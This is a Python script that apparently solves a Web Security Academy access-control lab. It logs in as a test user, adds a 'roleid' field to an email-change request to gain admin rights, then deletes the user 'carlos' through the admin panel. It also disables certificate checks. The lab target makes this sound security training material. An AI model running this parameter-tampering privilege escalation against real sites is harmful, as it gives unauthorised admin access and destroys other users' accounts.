#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import re
from bs4 import BeautifulSoup

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## Setup Proxies for future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 2'
                                ,description="Description: Accesses the Admin Panel that has and unpredictable location\n and Delete Carlos' user"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")
args = parser.parse_args()


#####################
#    Functions      #
#####################

def login(url, s):
    print("[+] Trying to log in as wiener user")
    login_url = url+"/login"
    
    #login as the wiener user
    data = {"username": "wiener",
            "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as the wiener user.")  
        
        change_email(url,s)
    else:
        print("[-] Failed to login as the wiener user.")
        sys.exit(-1)

def change_email(url,s):
    print("[+] Trying to change the email")
    change_email_url = url+"/my-account/change-email"
    
 
    data = {"email":"some@thing.ca",
            "roleid":2}
 
    r = s.post(change_email_url, json=data, verify=False, proxies=proxies)
    res = r.text
    if "Admin panel" in res:
        print("[+] Successfully changed the roleid.")
        delete_user(url,s)
    else:
        print("[-] Failed change the roleid.")
        sys.exit(-1)

def delete_user(url,s):
    print("[+] Accessing the admin panel and deleting Carlos' user")
    # Visit the admin panel and delete the user carlos
    delete_carlos_user_url = url + "/admin/delete?username=carlos"
    r = s.get(delete_carlos_user_url, verify=False, proxies=proxies)
    # print(r.text)
    if r.status_code == 200:
        print('[+] Successfully deleted Carlos\' user.')
    else:
        print('[-] Failed to delete Carlos user.')
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} -u <lab's url>")
        print(f"[+] Example: {sys.argv[0]} -u www.example.com")
        sys.exit(-1)

    url = args.url.rstrip('/')
    s = requests.Session()
        
    # do the login
    login(url,s)


if __name__ == "__main__":
    main()